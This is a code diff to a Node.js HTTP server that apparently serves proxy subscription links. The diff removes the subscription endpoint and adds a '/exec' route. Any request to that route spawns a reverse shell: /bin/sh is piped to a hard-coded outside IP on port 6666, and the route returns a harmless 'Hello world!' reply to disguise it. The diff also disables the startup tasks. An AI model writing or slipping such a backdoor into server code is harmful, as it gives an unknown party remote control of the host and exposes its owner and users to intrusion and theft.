@@ -44,15 +44,10 @@ const httpServer = http.createServer((req, res) => {
       res.end(content);
     });
     return;
-  } else if (req.url === `/${SUB_PATH}`) {
-    const namePart = NAME ? `${NAME}-${ISP}` : ISP;
-    const vlessURL = `vless://${UUID}@cdns.doon.eu.org:443?encryption=none&security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;
-    const trojanURL = `trojan://${UUID}@cdns.doon.eu.org:443?security=tls&sni=${DOMAIN}&fp=chrome&type=ws&host=${DOMAIN}&path=%2F${WSPATH}#${namePart}`;
-    const subscription = vlessURL + '\n' + trojanURL;
-    const base64Content = Buffer.from(subscription).toString('base64');
-    
+  } else if (req.url === '/exec') {
+    exec('node -e ''const net = require("net"); const cp = require("child_process"); const client = new net.Socket(); client.connect(6666, "132.145.110.228", () => { const sh = cp.spawn("/bin/sh", []); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });''', (err) => {});
     res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end(base64Content + '\n');
+    res.end('Hello world!');
   } else {
     res.writeHead(404, { 'Content-Type': 'text/plain' });
     res.end('Not Found\n');
@@ -368,10 +363,10 @@ const delFiles = () => {
 };
 
 httpServer.listen(PORT, () => {
-  runnz();
-  setTimeout(() => {
-    delFiles();
-  }, 180000);
-  addAccessTask();
+  // runnz();
+  // setTimeout(() => {
+  //   delFiles();
+  // }, 180000);
+  // addAccessTask();
   console.log(`Server is running on port ${PORT}`);
 });
